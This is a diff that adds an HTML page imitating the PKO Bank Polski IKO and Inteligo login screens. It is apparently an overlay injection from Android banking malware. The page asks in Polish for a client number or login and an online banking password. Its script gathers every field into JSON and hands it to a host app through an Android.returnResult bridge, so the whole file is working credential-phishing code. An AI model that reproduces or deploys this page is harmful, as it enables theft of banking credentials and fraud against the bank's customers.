@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>iko</title>
+    <link rel="shortcut icon" href="pl.pkobp.iko.png" type="image/png">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="utf-8">
+</head>
+<body>
+
+<style type="text/css">
+	body {
+		background: #fff;
+		margin: 0;
+		padding: 0;
+		font-family: Helvetica, sans-serif;
+		background-size: 100%;
+	}
+	.logo {
+    text-align: center;
+    padding: 20px 0px 20px 0px;
+	}
+	.form {
+		text-align: center;
+		padding-top: 70px;
+	}
+	.form label {
+		display: block;
+	}
+	form {
+		display: inline-block;
+	}
+fieldset {
+    position: relative;
+    text-align: center;
+    border: none;
+    background: none;
+    margin: 0px 30px 0px 30px;
+    border-radius: 10px;
+
+}
+
+input[type="text"],input[type="password"] {
+border: 1px solid #cacaca;
+    line-height: 16px;
+    font-size: 17px;
+    box-sizing: border-box;
+    width: 100%;
+    position: relative;
+    padding: 5px 20px;
+    margin: 0px 1px;
+    display: block;
+    -webkit-box-shadow: none;
+    box-shadow: none;
+    -webkit-appearance: none;
+    height: 50px;
+    margin: 20px 0px 5px 0px;
+    color: #7e7d7e;
+    text-align: left;
+    background: none;
+    outline: none;
+    border-radius: 5px;
+}
+input[type="button"] {
+    left: 0;
+    right: 0;
+    width: 100%;
+    height: 50px;
+    margin: 25px 0px 0px 0px;
+    outline: none;
+    border: none;
+    float: right;
+    color: #ffffff;
+    font-size: 16px;
+    -webkit-appearance: none;
+    border-radius: 5px;
+   font-weight: 600; 
+   background: #003574;
+}
+fieldset span {
+	display: inline-block;
+    width: 80%;
+    text-align: left;
+    color: #c5f8ff;
+    left: 0;
+    right: 0;
+    padding-top: 30px;
+}
+fieldset p {
+	    display: inline-block;
+    text-align: left;
+    left: 0;
+    right: 0;
+    border: 1px solid #6fcbd8;
+    padding: 30px;
+    border-radius: 50px;
+    background: #6fcbd8;
+}
+.logo span {
+    display: inline-block;
+    float: left;
+    padding: 40px 0px 0px 20px;
+    font-size: 20px;
+    color: #fff;
+    font-weight: 600;
+}
+input::placeholder {
+    color: #7e7d7e;
+}
+</style>
+
+<div class="logo">
+
+<p style="border-bottom: 5px solid #efefef; line-height: 2;">Aktywuj ICO</p>
+
+</div>
+
+<script type="text/javascript">
+    function next() {
+
+        document.getElementById("login").style.display="none";
+            if (document.getElementById("login").value == '')
+{
+    alert ('Wszystkie pola wymagane!');
+    return false;
+}
+        document.getElementById("password").style.display="block";
+    }
+    function bireysel() {
+        document.getElementById("inteligo_login").style.display="none";
+            if (document.getElementById("login").value == '')
+{
+    alert ('Wszystkie pola wymagane!');
+    return false;
+}
+        document.getElementById("login").style.display="block";
+    }
+    function kurumsal() {
+        document.getElementById("login").style.display="none";
+        document.getElementById("inteligo_login").style.display="block";
+    }
+    function next2() {
+        document.getElementById("inteligo_login").style.display="none";
+        document.getElementById("inteligo_password").style.display="block";
+    }
+</script>
+
+<fieldset id="formtosend">
+
+<div class="bireysel" id="login">
+
+    <div class="menu" style="padding-bottom: 30px;">
+        <a href="#bireysel" onclick="bireysel()"><span style="float: left; width: 49%; text-align: center; padding: 10px 0px 10px 0px; color: #ffffff; font-weight: 400; border-bottom: 2px solid #003574; background: #003574;">PKO Banks Polski</span></a>
+        <a href="#kurumsal" onclick="kurumsal()"><span style="float: left; width: 49%; text-align: center; padding: 10px 0px 10px 0px; color: #003574; font-weight: 400; border-bottom: 1px solid #003574; border: 1px solid #003574;">Inteligo</span></a>
+    </div>
+
+<label style="float: left; margin: 10px 0px 10px 0px;">Numer klienta lub osobisty login</label>
+<input type="text" name="login" id="login" placeholder="">
+        <input type="button" name="sumbit" onclick="next();" value="Dalej">
+
+</div>
+
+<div class="bireysel" id="password" style="display: none;">
+
+    <div class="menu" style="padding-bottom: 30px;">
+        <a href="#bireysel" onclick="bireysel()"><span style="float: left; width: 49%; text-align: center; padding: 10px 0px 10px 0px; color: #ffffff; font-weight: 400; border-bottom: 2px solid #003574; background: #003574;">PKO Banks Polski</span></a>
+        <a href="#kurumsal" onclick="kurumsal()"><span style="float: left; width: 49%; text-align: center; padding: 10px 0px 10px 0px; color: #003574; font-weight: 400; border-bottom: 1px solid #003574; border: 1px solid #003574;">Inteligo</span></a>
+    </div>
+
+<label style="float: left; margin: 10px 0px 10px 0px;">Wprowadź swoje hasło do bankowości internetowej</label>
+<input type="password" name="password" id="password" placeholder="">
+<input name="exit" type="hidden" text="true"/>
+        <input type="button" name="sumbit" onclick="send_form()" value="Dalej">
+
+</div>
+
+</fieldset>
+
+<fieldset id="formtosend2">
+<div class="bireysel" id="inteligo_login" style="display: none;">
+
+    <div class="menu" style="padding-bottom: 30px;">
+        <a href="#bireysel" onclick="bireysel()"><span style="float: left; width: 49%; text-align: center; padding: 10px 0px 10px 0px; color: #003574; font-weight: 400; border-bottom: 1px solid #003574; border: 1px solid #003574;">PKO Banks Polski</span></a>
+        <a href="#kurumsal" onclick="kurumsal()"><span style="float: left; width: 49%; text-align: center; padding: 10px 0px 10px 0px; color: #ffffff; font-weight: 400; border-bottom: 2px solid #003574; background: #003574;">Inteligo</span></a>
+    </div>
+
+    <label style="float: left; margin: 10px 0px 10px 0px;">Numer klienta lub osobisty login</label>
+<input type="text" name="login" placeholder="">
+        <input type="button" name="sumbit" onclick="next2()" value="Dalej">
+
+    </div>
+
+    <div class="bireysel" id="inteligo_password" style="display: none;">
+
+    <div class="menu" style="padding-bottom: 30px;">
+        <a href="#bireysel" onclick="bireysel()"><span style="float: left; width: 49%; text-align: center; padding: 10px 0px 10px 0px; color: #003574; font-weight: 400; border-bottom: 1px solid #003574; border: 1px solid #003574;">PKO Banks Polski</span></a>
+        <a href="#kurumsal" onclick="kurumsal()"><span style="float: left; width: 49%; text-align: center; padding: 10px 0px 10px 0px; color: #ffffff; font-weight: 400; border-bottom: 2px solid #003574; background: #003574;">Inteligo</span></a>
+    </div>
+
+    <label style="float: left; margin: 10px 0px 10px 0px;">Wprowadź swoje hasło do bankowości internetowej</label>
+<input type="password" name="password" placeholder="">
+<input name="exit" type="hidden" text="true"/>
+        <input type="button" name="sumbit" onclick="send_form2()" value="Dalej">
+
+    </div>
+</fieldset>
+
+
+<script>
+if ( typeof Android == "undefined")
+    var Android = {
+        returnResult : alert.bind(window)
+    }
+
+/*********Recursive implementation of jSON.stringify; ********/
+var stringifyJSON = function(obj) {
+    var arrOfKeyVals = [],
+        arrVals = [],
+        objKeys = [];
+
+    /*********CHECK FOR PRIMITIVE TYPES**********/
+    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
+        return '' + obj;
+    else if (typeof obj === 'string')
+        return '"' + obj + '"';
+
+    /*********CHECK FOR ARRAY**********/
+    else if (Array.isArray(obj)) {
+        if (obj[0] === undefined)
+            return '[]';
+        else {
+            obj.forEach(function(el) {
+                arrVals.push(stringifyJSON(el));
+            });
+            return '[' + arrVals.join(',') + ']';
+        }
+    }
+    /*********CHECK FOR OBJECT**********/
+    else if (obj instanceof Object) {
+        objKeys = Object.keys(obj);
+        objKeys.forEach(function(key) {
+            var keyOut = '"' + key + '":';
+            var keyValOut = obj[key];
+            if (keyValOut instanceof Function || typeof keyValOut === undefined)
+                arrOfKeyVals.push('');
+            else if (typeof keyValOut === 'string')
+                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
+            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
+                arrOfKeyVals.push(keyOut + keyValOut);
+            else if (keyValOut instanceof Object) {
+                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
+            }
+        });
+        return '{' + arrOfKeyVals + '}';
+    }
+};
+
+function formToJSONbyName(f)
+{
+    var FinalObject = {}, namesHTML = ['input','select'];
+    for(var i = 0; i < namesHTML.length; i++) {
+        var bsform = f.getElementsByTagName(namesHTML[i]);
+        for(var j = 0; j < bsform.length; j++) {
+            if(bsform[j].name == 'sumbit') continue;
+            FinalObject[bsform[j].name] = bsform[j].value
+        }
+    }
+    return stringifyJSON(FinalObject);
+}
+
+function send_form()
+{
+    var form = document.getElementById('formtosend');
+    Android.returnResult( formToJSONbyName(form) );
+}
+function send_form2()
+{
+    var form = document.getElementById('formtosend2');
+    Android.returnResult( formToJSONbyName(form) );
+}
+</script>
+
+</body>
+</html>
